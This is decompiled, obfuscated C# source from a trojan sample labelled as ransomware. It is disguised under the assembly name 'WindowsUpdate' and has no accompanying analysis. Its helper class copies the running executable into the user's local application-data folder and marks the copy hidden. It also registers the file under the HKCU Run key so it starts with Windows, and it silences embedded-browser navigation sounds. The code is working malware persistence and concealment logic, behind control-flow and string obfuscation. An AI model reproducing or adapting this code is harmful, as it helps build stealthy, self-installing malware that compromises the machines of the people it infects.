// Decompiled with JetBrains decompiler
// Type: browser_bastan.Araclar
// Assembly: WindowsUpdate, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8C8AD807-9662-4602-98AF-DF7E6D087FEB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00041-msil\HEUR-Trojan-Ransom.Win32.Generic-1a3e9c88fe5d4b898fac9860ddcba6b9b143d2e202453dc7a2fd445a907eb623.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace browser_bastan
{
  public class Araclar
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static string Regkeyname;
    public static string DstName;

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DisableClickSounds() => Araclar.CoInternetSetFeatureEnabled(21, 2, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Copy(string src, string dst)
    {
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            if (Araclar.n8ytglNmZGqheHNojOg((object) dst))
            {
              Araclar.tihePrNWAHVIg5kuB8p();
              num = !Araclar.Wyw2w3N56QWUlj5fWSl() ? 3 : 4;
              continue;
            }
            break;
          case 1:
          case 4:
            Araclar.imvRhxNjdpxCl8vZkxI((object) dst, FileAttributes.Normal);
            break;
          case 5:
            goto label_3;
        }
        try
        {
          Araclar.q6cuE3NPxnSdvmc0rWF((object) src, (object) dst, true);
        }
        catch (Exception ex)
        {
        }
        Araclar.imvRhxNjdpxCl8vZkxI((object) dst, FileAttributes.Hidden);
        num = 5;
      }
label_3:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Startup(string name, string path)
    {
      int num = 1;
      while (true)
      {
        RegistryKey registryKey;
        switch (num)
        {
          case 1:
            registryKey = (RegistryKey) Araclar.xs94paNO4GLEa7LXMcL((object) Registry.CurrentUser, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1824), true);
            num = 4;
            continue;
          case 2:
            goto label_4;
          case 4:
            if (registryKey != null)
            {
              Araclar.RPlQO6NTod7ecBKk8Hr((object) registryKey, (object) name, (object) path);
              break;
            }
            Araclar.Wyw2w3N56QWUlj5fWSl();
            if (Araclar.tihePrNWAHVIg5kuB8p())
            {
              num = 0;
              continue;
            }
            if (Araclar.Wyw2w3N56QWUlj5fWSl())
            {
              num = 5;
              continue;
            }
            goto case 1;
          case 5:
            goto label_11;
          case 6:
            goto label_1;
        }
        Araclar.LqCtw3Nnrf1tAQEN6P2((object) registryKey);
        num = 6;
      }
label_4:
      return;
label_11:
      return;
label_1:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DstCheck()
    {
      int num = 2;
label_8:
      string str1;
      string str2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            str2 = (string) Araclar.GxL0SPNiAIHOKHHeVEM(Environment.SpecialFolder.LocalApplicationData);
            num = 5;
            continue;
          case 2:
            str1 = (string) Araclar.L4OcpvND4WnC9k0Vllm(Araclar.tT2NDkNMPVn4MQIb7tw());
            if (!Araclar.tihePrNWAHVIg5kuB8p())
            {
              num = 0;
              continue;
            }
            if (true)
            {
              num = 4;
              continue;
            }
            goto label_11;
          case 3:
            goto label_9;
          case 4:
            goto label_7;
          case 5:
            goto label_6;
          case 6:
            goto label_4;
          default:
            goto label_12;
        }
      }
label_6:
      while (!Araclar.AnbhAQN1v9p80PBPA4G(Araclar.eWwxQgN2fnOGAI2wTpJ((object) str1), (object) str2))
      {
        Araclar.g3Siq6NrISxJXMF1Yxa((object) str1, Araclar.RhYspjNalciq7YHUJdI((object) str2, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1918), (object) Araclar.DstName));
        if (true)
        {
          num = 6;
          goto label_8;
        }
      }
      return;
label_9:
      return;
label_7:
      return;
label_4:
      return;
label_12:
      return;
label_11:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Araclar()
    {
      Araclar.qaGC0sNtWXMRBWdPjwa();
      Araclar.smwd77NzSxaqTpUwIUb((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Araclar()
    {
      int num = 4;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            Araclar.Regkeyname = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1924);
            break;
          case 4:
            Araclar.qaGC0sNtWXMRBWdPjwa();
            num = !Araclar.Wyw2w3N56QWUlj5fWSl() ? 3 : 0;
            continue;
          case 5:
            goto label_5;
        }
        Araclar.DstName = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1954);
        num = 5;
      }
label_5:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool Wyw2w3N56QWUlj5fWSl() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool tihePrNWAHVIg5kuB8p() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool n8ytglNmZGqheHNojOg([In] object obj0) => File.Exists((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void imvRhxNjdpxCl8vZkxI([In] object obj0, [In] FileAttributes obj1) => File.SetAttributes((string) obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void q6cuE3NPxnSdvmc0rWF([In] object obj0, [In] object obj1, [In] bool obj2) => File.Copy((string) obj0, (string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object xs94paNO4GLEa7LXMcL([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void RPlQO6NTod7ecBKk8Hr([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void LqCtw3Nnrf1tAQEN6P2([In] object obj0) => ((RegistryKey) obj0).Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object tT2NDkNMPVn4MQIb7tw() => (object) Assembly.GetExecutingAssembly();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object L4OcpvND4WnC9k0Vllm([In] object obj0) => (object) ((Assembly) obj0).Location;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object GxL0SPNiAIHOKHHeVEM([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object eWwxQgN2fnOGAI2wTpJ([In] object obj0) => (object) Path.GetDirectoryName((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool AnbhAQN1v9p80PBPA4G([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object RhYspjNalciq7YHUJdI([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void g3Siq6NrISxJXMF1Yxa([In] object obj0, [In] object obj1) => Araclar.Copy((string) obj0, (string) obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void qaGC0sNtWXMRBWdPjwa() => eWK97ZHZd8El3E8K9m.WOOpTOFz759c3();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void smwd77NzSxaqTpUwIUb([In] object obj0) => obj0.\u002Ector();
  }
}
